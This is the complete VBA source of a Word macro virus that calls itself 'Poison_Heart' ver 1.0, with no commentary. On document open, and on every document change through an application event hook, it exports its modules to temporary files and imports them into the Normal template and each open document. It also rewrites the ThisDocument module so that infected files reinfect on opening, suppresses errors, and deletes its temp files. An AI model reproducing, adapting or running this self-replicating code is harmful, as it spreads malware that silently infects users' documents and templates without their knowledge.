   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Open()
   Word_Poison
   End Sub

   Attribute VB_Name = "Poison_Heart"
   'Poison_Heart'
   'ver 1.0'

   Option Explicit
   Dim X As New Poison_Heart_Class
   Const temp = "~Temp1.bas"
   Const temp1 = "~Temp.bas"
   Dim i As Integer


   Sub AutoExec()
    Set X.App = Word.Application
   End Sub

   Public Sub DocHookProc()

   Dim Obj As Object
    Dim Bar As CommandBar
    On Error Resume Next
    Application.NormalTemplate.VBProject.VBComponents("Poison_Heart").Export (temp)
    Application.NormalTemplate.VBProject.VBComponents("Poison_Heart_Class").Export (temp1)
    Err = 0
    Set Obj = ActiveDocument.VBProject.VBComponents("Poison_Heart")
    If Err <> 0 Then
     ActiveDocument.VBProject.VBComponents.Import (temp)
    End If
    Err = 0
    Set Obj = ActiveDocument.VBProject.VBComponents("Poison_Heart_Class")
    If Err <> 0 Then
      ActiveDocument.VBProject.VBComponents.Import (temp1)
    End If

    Kill temp
    Kill temp1

   For i = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
     ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines (1)
   Next i
   ActiveDocument.VBProject.VBComponents(1).CodeModule.AddFromString ("Private Sub Document_Open()")
   ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 2, "Word_Poison"
   ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 3, "End Sub"


   End Sub

   Sub Word_Poison()

   Dim Obj As Object
    Dim Bar As CommandBar
    On Error Resume Next
    ActiveDocument.VBProject.VBComponents("Poison_Heart").Export (temp)
    ActiveDocument.VBProject.VBComponents("Poison_Heart_Class").Export (temp1)
    Err = 0
    Set Obj = Application.NormalTemplate.VBProject.VBComponents("Poison_Heart")
    If Err <> 0 Then
     Application.NormalTemplate.VBProject.VBComponents.Import (temp)
    End If
    Err = 0
    Set Obj = Application.NormalTemplate.VBProject.VBComponents("Poison_Heart_Class")
    If Err <> 0 Then
     Application.NormalTemplate.VBProject.VBComponents.Import (temp1)
    End If

    Kill temp
    Kill temp1

   End Sub

   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "Poison_Heart_Class"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = False
   Attribute VB_Exposed = False



   'Poison_Heart'
   'ver 1.0'

   Public WithEvents App As Word.Application
   Attribute App.VB_VarHelpID = -1



   Private Sub App_DocumentChange()
    DocHookProc
   End Sub
